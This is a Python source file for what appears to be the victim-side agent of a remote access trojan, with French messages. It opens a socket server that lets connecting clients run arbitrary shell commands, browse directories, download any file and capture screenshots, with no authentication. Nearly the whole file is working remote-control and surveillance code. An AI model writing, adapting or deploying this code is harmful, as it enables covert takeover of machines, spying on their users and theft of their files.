from base_socket import *
from string_coloring import CYAN
from PIL import ImageGrab
import subprocess
from spliter import commande_spliter


class Target(MultipleClientsServerSocket):
    def __init__(self):
        super().__init__()

    def accept_commands(self, addr: tuple):
        while True:
            commande = self.recv_header_and_data(recv_sock=self.clientsockets[addr]).decode(encoding=ENCODING)
            splited_commande = commande_spliter(commande)

            if not commande:
                break

            elif commande == 'exit':
                break

            elif commande.lower() == 'os':
                result = platform.platform() + '\n'

            elif commande.lower() == 'info':
                result = os.getcwd()

            elif splited_commande[0] == 'cd':
                try:
                    os.chdir(splited_commande[1])
                    result = os.getcwd() + '\n'
                except FileNotFoundError as err:
                    result = colored_error(str(err))
                    print(result)

            elif splited_commande[0] == 'download':
                try:
                    with open(splited_commande[1], 'rb') as f:
                        result = f.read()
                except FileNotFoundError as err:
                    print(str(err))
                    result = 'filenotfound'
                except IsADirectoryError as err:
                    print(str(err))
                    result = 'isdir'

            elif splited_commande[0] == 'capture':
                try:
                    image = ImageGrab.grab()
                    image.save(splited_commande[1], 'png')
                    with open(splited_commande[1], 'rb') as img:
                        result = img.read()
                    os.remove(splited_commande[1])
                except OSError as err:
                    print(str(err))
                    result = 'screenshot-error'

            else:
                output = subprocess.run(commande, shell=True, universal_newlines=True, capture_output=True)
                if output.stdout is None:
                    result = colored_error(f'❗ Erreur!')
                elif output.stdout == '':
                    result = colored_error(output.stderr)
                else:
                    result = output.stdout

            if commande.lower() != 'info':
                print(f'{CYAN} ⌨️   > {commande}')

            if not result:
                self.send_header_and_data(self.clientsockets[addr], colored_error(f'❗ Erreur!').encode())
            else:
                if isinstance(result, str):
                    result = result.encode(encoding=ENCODING)
                self.send_header_and_data(self.clientsockets[addr], result)

        print(colored_success(f'\n‼️ Deconnecte\n'))
        self.clientsockets[addr].close()

    def handle_clients(self, addr: tuple):
        print(f'💻 {addr} connecte 💻')
        print(f'💻 Client(s) connecte(s): {threading.active_count()} 💻')
        self.accept_commands(addr)
        del self.clientsockets[addr]


if __name__ == '__main__':

    while True:
        target = Target()
        target.linsten_multiple_clients()
